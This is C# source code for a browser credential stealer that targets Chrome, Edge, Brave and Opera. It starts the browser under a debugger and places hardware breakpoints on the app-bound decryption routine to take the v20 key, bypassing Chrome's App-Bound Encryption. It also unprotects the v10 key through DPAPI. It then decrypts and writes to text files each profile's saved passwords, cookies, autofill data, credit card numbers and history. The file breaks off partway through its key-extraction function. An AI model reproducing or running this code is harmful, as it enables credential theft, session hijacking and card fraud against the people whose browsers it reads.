using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Data.Sqlite;
using Newtonsoft.Json.Linq;
using System.Security.Cryptography;

namespace BrowserExtractorCS
{
    public class BrowserExtractor
    {
        #region Win32 API

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcess(
            string lpApplicationName,
            IntPtr lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WaitForDebugEvent(out DEBUG_EVENT lpDebugEvent, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ContinueDebugEvent(uint dwProcessId, uint dwThreadId, uint dwContinueStatus);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint SuspendThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern uint GetFinalPathNameByHandle(IntPtr hFile, [Out] StringBuilder lpszFilePath, uint cchFilePath, uint dwFlags);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool Thread32First(IntPtr hSnapshot, ref THREADENTRY32 lpte);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool Thread32Next(IntPtr hSnapshot, ref THREADENTRY32 lpte);

        [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CryptStringToBinary(string pszString, uint cchString, uint dwFlags, byte[] pbBinary, ref uint pcbBinary, IntPtr pdwSkip, IntPtr pdwFlags);

        #endregion

        #region Constants

        public const uint DEBUG_PROCESS = 0x00000001;
        public const uint DEBUG_ONLY_THIS_PROCESS = 0x00000002;
        public const uint CREATE_NEW_CONSOLE = 0x00000010;

        public const uint EXCEPTION_DEBUG_EVENT = 1;
        public const uint CREATE_THREAD_DEBUG_EVENT = 2;
        public const uint EXIT_PROCESS_DEBUG_EVENT = 5;
        public const uint LOAD_DLL_DEBUG_EVENT = 6;

        public const uint DBG_CONTINUE = 0x00010002;
        public const uint INFINITE = 0xFFFFFFFF;

        public const uint EXCEPTION_SINGLE_STEP = 0x80000004;

        public const uint TH32CS_SNAPPROCESS = 0x00000002;
        public const uint TH32CS_SNAPTHREAD = 0x00000004;

        public const uint PROCESS_TERMINATE = 0x0001;

        public const uint THREAD_GET_CONTEXT = 0x0008;
        public const uint THREAD_SET_CONTEXT = 0x0010;
        public const uint THREAD_SUSPEND_RESUME = 0x0002;

        public const uint CONTEXT_AMD64 = 0x00100000;
        public const uint CONTEXT_CONTROL = CONTEXT_AMD64 | 0x00000001;
        public const uint CONTEXT_INTEGER = CONTEXT_AMD64 | 0x00000002;
        public const uint CONTEXT_SEGMENTS = CONTEXT_AMD64 | 0x00000004;
        public const uint CONTEXT_FLOATING_POINT = CONTEXT_AMD64 | 0x00000008;
        public const uint CONTEXT_DEBUG_REGISTERS = CONTEXT_AMD64 | 0x00000010;
        public const uint CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS;

        public const uint CRYPT_STRING_BASE64 = 0x00000001;

        #endregion

        #region Structures

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct DEBUG_EVENT
        {
            [FieldOffset(0)]
            public uint dwDebugEventCode;
            [FieldOffset(4)]
            public uint dwProcessId;
            [FieldOffset(8)]
            public uint dwThreadId;
            [FieldOffset(16)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1024)]
            public byte[] u;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LOAD_DLL_DEBUG_INFO
        {
            public IntPtr hFile;
            public IntPtr lpBaseOfDll;
            public uint dwDebugInfoFileOffset;
            public uint nDebugInfoSize;
            public IntPtr lpImageName;
            public ushort fUnicode;
            public ushort wPadding;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_DEBUG_INFO
        {
            public EXCEPTION_RECORD ExceptionRecord;
            public uint dwFirstChance;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_RECORD
        {
            public uint ExceptionCode;
            public uint ExceptionFlags;
            public IntPtr ExceptionRecordPtr;
            public IntPtr ExceptionAddress;
            public uint NumberParameters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15)]
            public IntPtr[] ExceptionInformation;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;
            public uint ContextFlags;
            public uint MxCsr;
            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;
            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;
            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] VectorContext;
            public ulong VectorControl;
            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct PROCESSENTRY32
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ProcessID;
            public IntPtr th32DefaultHeapID;
            public uint th32ModuleID;
            public uint cntThreads;
            public uint th32ParentProcessID;
            public int pcPriClassBase;
            public uint dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string szExeFile;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct THREADENTRY32
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ThreadID;
            public uint th32OwnerProcessID;
            public int tpBasePri;
            public int tpDeltaPri;
            public uint dwFlags;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DOS_HEADER
        {
            public ushort e_magic;
            public ushort e_cblp;
            public ushort e_cp;
            public ushort e_crlc;
            public ushort e_cparhdr;
            public ushort e_minalloc;
            public ushort e_maxalloc;
            public ushort e_ss;
            public ushort e_sp;
            public ushort e_csum;
            public ushort e_ip;
            public ushort e_cs;
            public ushort e_lfarlc;
            public ushort e_ovno;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public ushort[] e_res;
            public ushort e_oemid;
            public ushort e_oeminfo;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public ushort[] e_res2;
            public int e_lfanew;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_FILE_HEADER
        {
            public ushort Machine;
            public ushort NumberOfSections;
            public uint TimeDateStamp;
            public uint PointerToSymbolTable;
            public uint NumberOfSymbols;
            public ushort SizeOfOptionalHeader;
            public ushort Characteristics;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public uint VirtualAddress;
            public uint Size;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            public ushort Magic;
            public byte MajorLinkerVersion;
            public byte MinorLinkerVersion;
            public uint SizeOfCode;
            public uint SizeOfInitializedData;
            public uint SizeOfUninitializedData;
            public uint AddressOfEntryPoint;
            public uint BaseOfCode;
            public ulong ImageBase;
            public uint SectionAlignment;
            public uint FileAlignment;
            public ushort MajorOperatingSystemVersion;
            public ushort MinorOperatingSystemVersion;
            public ushort MajorImageVersion;
            public ushort MinorImageVersion;
            public ushort MajorSubsystemVersion;
            public ushort MinorSubsystemVersion;
            public uint Win32VersionValue;
            public uint SizeOfImage;
            public uint SizeOfHeaders;
            public uint CheckSum;
            public ushort Subsystem;
            public ushort DllCharacteristics;
            public ulong SizeOfStackReserve;
            public ulong SizeOfStackCommit;
            public ulong SizeOfHeapReserve;
            public ulong SizeOfHeapCommit;
            public uint LoaderFlags;
            public uint NumberOfRvaAndSizes;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public IMAGE_DATA_DIRECTORY[] DataDirectory;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_NT_HEADERS64
        {
            public uint Signature;
            public IMAGE_FILE_HEADER FileHeader;
            public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_SECTION_HEADER
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] Name;
            public uint VirtualSize;
            public uint VirtualAddress;
            public uint SizeOfRawData;
            public uint PointerToRawData;
            public uint PointerToRelocations;
            public uint PointerToLinenumbers;
            public ushort NumberOfRelocations;
            public ushort NumberOfLinenumbers;
            public uint Characteristics;
        }

        #endregion

        public class BrowserConfig
        {
            public string Name { get; set; }
            public string ProcessName { get; set; }
            public string[] ExePaths { get; set; }
            public string DllName { get; set; }
            public string[] UserDataSubdir { get; set; }
            public string OutputDir { get; set; }
            public string TempPrefix { get; set; }
            public bool UseR14 { get; set; }
            public bool UseRoaming { get; set; }
            public bool HasAbe { get; set; }
        }

        public static List<BrowserConfig> GetConfigs()
        {
            return new List<BrowserConfig>
            {
                new BrowserConfig {
                    Name = "Google Chrome",
                    ProcessName = "chrome.exe",
                    ExePaths = new[] {
                        @"C:\Program Files\Google\Chrome\Application\chrome.exe",
                        @"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
                    },
                    DllName = "chrome.dll",
                    UserDataSubdir = new[] { "Google", "Chrome", "User Data" },
                    OutputDir = "chrome_extract",
                    TempPrefix = "chrome_tmp",
                    UseR14 = false,
                    UseRoaming = false,
                    HasAbe = true
                },
                new BrowserConfig {
                    Name = "Microsoft Edge",
                    ProcessName = "msedge.exe",
                    ExePaths = new[] {
                        @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                        @"C:\Program Files\Microsoft\Edge\Application\msedge.exe"
                    },
                    DllName = "msedge.dll",
                    UserDataSubdir = new[] { "Microsoft", "Edge", "User Data" },
                    OutputDir = "edge_extract",
                    TempPrefix = "edge_tmp",
                    UseR14 = true,
                    UseRoaming = false,
                    HasAbe = true
                },
                new BrowserConfig {
                    Name = "Brave",
                    ProcessName = "brave.exe",
                    ExePaths = new[] {
                        @"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
                        @"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe"
                    },
                    DllName = "chrome.dll",
                    UserDataSubdir = new[] { "BraveSoftware", "Brave-Browser", "User Data" },
                    OutputDir = "brave_extract",
                    TempPrefix = "brave_tmp",
                    UseR14 = false,
                    UseRoaming = false,
                    HasAbe = true
                },
                new BrowserConfig {
                    Name = "Opera Stable",
                    ProcessName = "opera.exe",
                    ExePaths = new[] {
                        @"C:\Users\Kemal\AppData\Local\Programs\Opera\opera.exe",
                        @"C:\Program Files\Opera\launcher.exe",
                        @"C:\Program Files (x86)\Opera\launcher.exe"
                    },
                    DllName = "launcher_lib.dll",
                    UserDataSubdir = new[] { "Opera Software", "Opera Stable" },
                    OutputDir = "opera_extract",
                    TempPrefix = "opera_tmp",
                    UseR14 = false,
                    UseRoaming = true,
                    HasAbe = false
                },
                new BrowserConfig {
                    Name = "Opera GX",
                    ProcessName = "opera.exe",
                    ExePaths = new[] {
                        @"C:\Users\Kemal\AppData\Local\Programs\Opera GX\opera.exe",
                        @"C:\Program Files\Opera GX\launcher.exe",
                        @"C:\Program Files (x86)\Opera GX\launcher.exe"
                    },
                    DllName = "launcher_lib.dll",
                    UserDataSubdir = new[] { "Opera Software", "Opera GX Stable" },
                    OutputDir = "operagx_extract",
                    TempPrefix = "operagx_tmp",
                    UseR14 = false,
                    UseRoaming = true,
                    HasAbe = false
                }
            };
        }

        public static IntPtr FindTargetAddress(IntPtr hProcess, IntPtr baseAddr, string browserName)
        {
            byte[] dosHeaderBytes = new byte[Marshal.SizeOf(typeof(IMAGE_DOS_HEADER))];
            int bytesRead;
            if (!ReadProcessMemory(hProcess, baseAddr, dosHeaderBytes, dosHeaderBytes.Length, out bytesRead)) return IntPtr.Zero;

            IMAGE_DOS_HEADER dosHeader = MemoryHelper.ByteArrayToStructure<IMAGE_DOS_HEADER>(dosHeaderBytes);
            IntPtr ntHeadersPtr = baseAddr + dosHeader.e_lfanew;

            byte[] ntHeadersBytes = new byte[Marshal.SizeOf(typeof(IMAGE_NT_HEADERS64))];
            if (!ReadProcessMemory(hProcess, ntHeadersPtr, ntHeadersBytes, ntHeadersBytes.Length, out bytesRead)) return IntPtr.Zero;

            IMAGE_NT_HEADERS64 ntHeaders = MemoryHelper.ByteArrayToStructure<IMAGE_NT_HEADERS64>(ntHeadersBytes);

            int sectionCount = ntHeaders.FileHeader.NumberOfSections;
            IntPtr sectionHeaderPtr = ntHeadersPtr + Marshal.SizeOf(typeof(IMAGE_NT_HEADERS64));
            List<IMAGE_SECTION_HEADER> sections = new List<IMAGE_SECTION_HEADER>();

            for (int i = 0; i < sectionCount; i++)
            {
                byte[] sectionBytes = new byte[Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER))];
                ReadProcessMemory(hProcess, sectionHeaderPtr + (i * Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER))), sectionBytes, sectionBytes.Length, out bytesRead);
                sections.Add(MemoryHelper.ByteArrayToStructure<IMAGE_SECTION_HEADER>(sectionBytes));
            }

            string targetString = "OSCrypt.AppBoundProvider.Decrypt.ResultCode";
            IntPtr stringVa = IntPtr.Zero;

            foreach (var section in sections)
            {
                string name = Encoding.UTF8.GetString(section.Name).TrimEnd('\0');
                if (name == ".rdata")
                {
                    byte[] sectionData = ReadProcessMemoryChunk(hProcess, baseAddr + (int)section.VirtualAddress, (int)section.VirtualSize);
                    int pos = FindSubsequence(sectionData, Encoding.UTF8.GetBytes(targetString));
                    if (pos != -1)
                    {
                        stringVa = baseAddr + (int)section.VirtualAddress + pos;
                        break;
                    }
                }
            }

            if (stringVa == IntPtr.Zero)
            {
                Console.WriteLine($"Could not find target string in {browserName}'s .rdata section");
                return IntPtr.Zero;
            }

            foreach (var section in sections)
            {
                string name = Encoding.UTF8.GetString(section.Name).TrimEnd('\0');
                if (name == ".text")
                {
                    IntPtr sectionStart = baseAddr + (int)section.VirtualAddress;
                    byte[] sectionData = ReadProcessMemoryChunk(hProcess, sectionStart, (int)section.VirtualSize);

                    int pos = 0;
                    while (pos + 7 <= sectionData.Length)
                    {
                        // 48 8D 0D (LEA RCX, [RIP + offset])
                        if (sectionData[pos] == 0x48 && sectionData[pos + 1] == 0x8D && sectionData[pos + 2] == 0x0D)
                        {
                            int offset = BitConverter.ToInt32(sectionData, pos + 3);
                            long rip = (long)sectionStart + pos + 7;
                            long target = rip + offset;

                            if (target == (long)stringVa)
                            {
                                Console.WriteLine($"Found matching LEA instruction at 0x{(long)sectionStart + pos:X} for {browserName}");
                                return sectionStart + pos;
                            }
                        }
                        pos++;
                    }
                }
            }

            Console.WriteLine($"Could not find matching LEA instruction in {browserName}'s .text section");
            return IntPtr.Zero;
        }

        public static byte[] ReadProcessMemoryChunk(IntPtr hProcess, IntPtr addr, int size)
        {
            byte[] buffer = new byte[size];
            int bytesRead;
            ReadProcessMemory(hProcess, addr, buffer, size, out bytesRead);
            return buffer;
        }

        public static int FindSubsequence(byte[] haystack, byte[] needle)
        {
            for (int i = 0; i <= haystack.Length - needle.Length; i++)
            {
                bool match = true;
                for (int j = 0; j < needle.Length; j++)
                {
                    if (haystack[i + j] != needle[j])
                    {
                        match = false;
                        break;
                    }
                }
                if (match) return i;
            }
            return -1;
        }

        public static (byte[] Key, bool IsDpapi)? GetV10Key(string userDataDir)
        {
            string localStatePath = Path.Combine(userDataDir, "Local State");
            if (!File.Exists(localStatePath)) return null;

            try
            {
                string content = File.ReadAllText(localStatePath);
                JObject json = JObject.Parse(content);
                string encryptedKeyB64 = json["os_crypt"]?["encrypted_key"]?.ToString();
                if (string.IsNullOrEmpty(encryptedKeyB64)) return null;

                byte[] encryptedKey = Convert.FromBase64String(encryptedKeyB64);
                bool isDpapi = Encoding.ASCII.GetString(encryptedKey).StartsWith("DPAPI");

                byte[] encryptedBlob = isDpapi ? encryptedKey.Skip(5).ToArray() : encryptedKey;
                byte[] key = ProtectedData.Unprotect(encryptedBlob, null, DataProtectionScope.CurrentUser);

                if (key.Length == 32) return (key, isDpapi);
            }
            catch { }
            return null;
        }

        public static string GetUserDataDir(string[] subdir, bool useRoaming)
        {
            string appData = useRoaming ? Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) : Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string path = appData;
            foreach (var component in subdir)
            {
                path = Path.Combine(path, component);
            }
            return Directory.Exists(path) ? path : null;
        }

        public static List<string> DiscoverProfiles(string userDataDir)
        {
            List<string> profiles = new List<string>();
            if (!Directory.Exists(userDataDir)) return profiles;

            foreach (var dir in Directory.GetDirectories(userDataDir))
            {
                if (File.Exists(Path.Combine(dir, "Preferences")))
                {
                    profiles.Add(Path.GetFileName(dir));
                }
            }
            return profiles;
        }

        public static byte[] DecryptBlob(byte[] blob, byte[] v10Key, byte[] v20Key, bool isOpera)
        {
            if (blob == null || blob.Length <= 15) return null;

            string prefix = Encoding.ASCII.GetString(blob, 0, 3);
            if (prefix == "v10" || prefix == "v20")
            {
                byte[] key = (prefix == "v10") ? v10Key : v20Key;
                if (key == null && prefix == "v10") key = v20Key; // Fallback
                if (key == null) return null;

                byte[] nonce = blob.Skip(3).Take(12).ToArray();
                byte[] ciphertext = blob.Skip(15).ToArray();

                try
                {
                    byte[] dec = AesGcmDecrypt(key, nonce, ciphertext);
                    if (dec != null)
                    {
                        if (isOpera && dec.Length > 32) return dec.Skip(32).ToArray();
                        if (prefix == "v20" && dec.Length > 32) return dec.Skip(32).ToArray();
                        return dec;
                    }
                }
                catch { }
            }
            else
            {
                try
                {
                    return ProtectedData.Unprotect(blob, null, DataProtectionScope.CurrentUser);
                }
                catch { }
            }

            return null;
        }

        public static byte[] AesGcmDecrypt(byte[] key, byte[] nonce, byte[] ciphertext)
        {
            return BCryptAesGcm.Decrypt(key, nonce, null, ciphertext, ciphertext.Skip(ciphertext.Length - 16).ToArray());
        }

        public static void ExtractAllProfilesData(byte[] v20Key, BrowserConfig config, string userDataDir)
        {
            var v10KeyInfo = GetV10Key(userDataDir);
            byte[] v10Key = v10KeyInfo?.Key;

            var profiles = DiscoverProfiles(userDataDir);
            string extractRoot = config.OutputDir;
            Directory.CreateDirectory(extractRoot);

            bool isOpera = config.Name.Contains("Opera");

            foreach (var profileName in profiles)
            {
                Console.WriteLine($"Extracting data for profile: {profileName}");
                string profilePath = Path.Combine(userDataDir, profileName);
                string outputDir = Path.Combine(extractRoot, profileName);
                Directory.CreateDirectory(outputDir);

                ExtractPasswords(profilePath, outputDir, v10Key, v20Key, config.TempPrefix, isOpera);
                ExtractCookies(profilePath, outputDir, v10Key, v20Key, config.TempPrefix, isOpera);
                ExtractAutofill(profilePath, outputDir, v10Key, v20Key, config.TempPrefix, isOpera);
                ExtractHistory(profilePath, outputDir, config.TempPrefix);
            }
            Console.WriteLine($"Extraction complete. Data saved in {config.OutputDir} folder.");
        }

        private static void ExtractPasswords(string profilePath, string outputDir, byte[] v10Key, byte[] v20Key, string tempPrefix, bool isOpera)
        {
            string dbPath = Path.Combine(profilePath, "Login Data");
            if (!File.Exists(dbPath)) return;

            string tempPath = Path.Combine(Path.GetTempPath(), $"{tempPrefix}_{Guid.NewGuid()}");
            File.Copy(dbPath, tempPath);

            using (var conn = new SqliteConnection($"Data Source={tempPath};Pooling=False"))
            {
                conn.Open();
                using (var cmd = new SqliteCommand("SELECT origin_url, username_value, password_value FROM logins", conn))
                using (var reader = cmd.ExecuteReader())
                using (var writer = new StreamWriter(Path.Combine(outputDir, "passwords.txt")))
                {
                    while (reader.Read())
                    {
                        string url = reader.GetString(0);
                        string user = reader.GetString(1);
                        byte[] blob = (byte[])reader[2];

                        byte[] dec = DecryptBlob(blob, v10Key, v20Key, isOpera);
                        if (dec != null)
                        {
                            writer.WriteLine($"URL: {url}\nUser: {user}\nPass: {Encoding.UTF8.GetString(dec)}\n---");
                        }
                    }
                }
            }
            SafeDelete(tempPath);
        }

        private static void SafeDelete(string path)
        {
            if (!File.Exists(path)) return;
            for (int i = 0; i < 5; i++)
            {
                try
                {
                    File.Delete(path);
                    return;
                }
                catch
                {
                    System.Threading.Thread.Sleep(500);
                }
            }
        }

        private static void ExtractCookies(string profilePath, string outputDir, byte[] v10Key, byte[] v20Key, string tempPrefix, bool isOpera)
        {
            string dbPath = Path.Combine(profilePath, "Network", "Cookies");
            if (!File.Exists(dbPath)) dbPath = Path.Combine(profilePath, "Cookies");
            if (!File.Exists(dbPath)) return;

            string tempPath = Path.Combine(Path.GetTempPath(), $"{tempPrefix}_{Guid.NewGuid()}");
            File.Copy(dbPath, tempPath);

            using (var conn = new SqliteConnection($"Data Source={tempPath};Pooling=False"))
            {
                conn.Open();
                using (var cmd = new SqliteCommand("SELECT host_key, name, value, encrypted_value FROM cookies", conn))
                using (var reader = cmd.ExecuteReader())
                using (var writer = new StreamWriter(Path.Combine(outputDir, "cookies.txt")))
                {
                    while (reader.Read())
                    {
                        string host = reader.GetString(0);
                        string name = reader.GetString(1);
                        string val = reader.GetString(2);
                        byte[] blob = (byte[])reader[3];

                        byte[] dec = DecryptBlob(blob, v10Key, v20Key, isOpera);
                        string cookieVal = dec != null ? Encoding.UTF8.GetString(dec) : val;

                        if (!string.IsNullOrEmpty(cookieVal))
                        {
                            writer.WriteLine($"Host: {host} | Name: {name} | Value: {cookieVal}");
                        }
                    }
                }
            }
            SafeDelete(tempPath);
        }

        private static void ExtractAutofill(string profilePath, string outputDir, byte[] v10Key, byte[] v20Key, string tempPrefix, bool isOpera)
        {
            string dbPath = Path.Combine(profilePath, "Web Data");
            if (!File.Exists(dbPath)) return;

            string tempPath = Path.Combine(Path.GetTempPath(), $"{tempPrefix}_{Guid.NewGuid()}");
            File.Copy(dbPath, tempPath);

            using (var conn = new SqliteConnection($"Data Source={tempPath};Pooling=False"))
            {
                conn.Open();
                using (var writer = new StreamWriter(Path.Combine(outputDir, "autofill.txt")))
                {
                    // Form History
                    try {
                        using (var cmd = new SqliteCommand("SELECT name, value FROM autofill", conn))
                        using (var reader = cmd.ExecuteReader())
                        {
                            while (reader.Read()) writer.WriteLine($"Form: {reader.GetString(0)} = {reader.GetString(1)}");
                        }
                    } catch {}

                    // Credit Cards
                    try {
                        using (var cmd = new SqliteCommand("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", conn))
                        using (var reader = cmd.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                byte[] dec = DecryptBlob((byte[])reader[3], v10Key, v20Key, isOpera);
                                if (dec != null)
                                {
                                    writer.WriteLine($"Card: {reader.GetString(0)} | Exp: {reader.GetInt32(1)}/{reader.GetInt32(2)} | Num: {Encoding.UTF8.GetString(dec)}");
                                }
                            }
                        }
                    } catch {}
                }
            }
            SafeDelete(tempPath);
        }

        private static void ExtractHistory(string profilePath, string outputDir, string tempPrefix)
        {
            string dbPath = Path.Combine(profilePath, "History");
            if (!File.Exists(dbPath)) return;

            string tempPath = Path.Combine(Path.GetTempPath(), $"{tempPrefix}_{Guid.NewGuid()}");
            File.Copy(dbPath, tempPath);

            using (var conn = new SqliteConnection($"Data Source={tempPath};Pooling=False"))
            {
                conn.Open();
                using (var cmd = new SqliteCommand("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 100", conn))
                using (var reader = cmd.ExecuteReader())
                using (var writer = new StreamWriter(Path.Combine(outputDir, "history.txt")))
                {
                    while (reader.Read())
                    {
                        writer.WriteLine($"URL: {reader.GetString(0)} | Title: {reader.GetString(1)} | Visits: {reader.GetInt32(2)}");
                    }
                }
            }
            SafeDelete(tempPath);
        }

        public static void DebugLoop(uint mainProcessId, IntPtr hProcess, BrowserConfig config, string userDataDir)
        {
            DEBUG_EVENT debugEvent;
            IntPtr targetAddress = IntPtr.Zero;

            while (true)
            {
                if (!WaitForDebugEvent(out debugEvent, INFINITE)) break;

                // Ignore events from child processes if any
                if (debugEvent.dwProcessId != mainProcessId)
                {
                    ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
                    continue;
                }

                if (debugEvent.dwDebugEventCode == LOAD_DLL_DEBUG_EVENT)
                {
                    LOAD_DLL_DEBUG_INFO loadDll = MemoryHelper.ByteArrayToStructure<LOAD_DLL_DEBUG_INFO>(debugEvent.u);
                    StringBuilder pathBuilder = new StringBuilder(260);
                    uint len = GetFinalPathNameByHandle(loadDll.hFile, pathBuilder, (uint)pathBuilder.Capacity, 0);
                    if (len > 0)
                    {
                        string path = pathBuilder.ToString();
                        if (path.Contains(config.DllName))
                        {
                            Console.WriteLine($"Found {config.DllName} at {loadDll.lpBaseOfDll:X}");
                            targetAddress = FindTargetAddress(hProcess, loadDll.lpBaseOfDll, config.Name);
                            if (targetAddress != IntPtr.Zero)
                            {
                                var threads = GetAllThreads(debugEvent.dwProcessId);
                                Console.WriteLine($"Setting hardware breakpoints for {config.Name} on {threads.Count} threads");
                                foreach (var threadId in threads)
                                {
                                    SetHardwareBreakpoint(threadId, targetAddress);
                                }
                            }
                        }
                    }
                }
                else if (debugEvent.dwDebugEventCode == CREATE_THREAD_DEBUG_EVENT)
                {
                    if (targetAddress != IntPtr.Zero)
                    {
                        SetHardwareBreakpoint(debugEvent.dwThreadId, targetAddress);
                    }
                }
                else if (debugEvent.dwDebugEventCode == EXCEPTION_DEBUG_EVENT)
                {
                    EXCEPTION_DEBUG_INFO exceptionInfo = MemoryHelper.ByteArrayToStructure<EXCEPTION_DEBUG_INFO>(debugEvent.u);
                    if (exceptionInfo.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP)
                    {
                        if (exceptionInfo.ExceptionRecord.ExceptionAddress == targetAddress)
                        {
                            Console.WriteLine($"Target breakpoint hit at 0x{targetAddress:X} on thread {debugEvent.dwThreadId}");
                            if (ExtractKey(debugEvent.dwThreadId, hProcess, config, userDataDir))
                            {
                                ClearHardwareBreakpoints(debugEvent.dwProcessId);
                                TerminateProcess(hProcess, 0);
                            }
                        }
                        SetResumeFlag(debugEvent.dwThreadId);
                    }
                }
                else if (debugEvent.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT)
                {
                    break;
                }

                ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
            }
        }

        public static bool ExtractKey(uint threadId, IntPtr hProcess, BrowserConfig config, string userDataDir)
        {
            IntPtr hThread = OpenThread(THREAD_GET_CONTEXT, false, threadId);
            if (hThread == IntPtr.Zero) return false;

            bool success = false;
            CONTEXT context = new CONTEXT();
            context.ContextFlags = CONTEXT_FULL;
            if (GetThreadContext(hThread, ref context))
            {
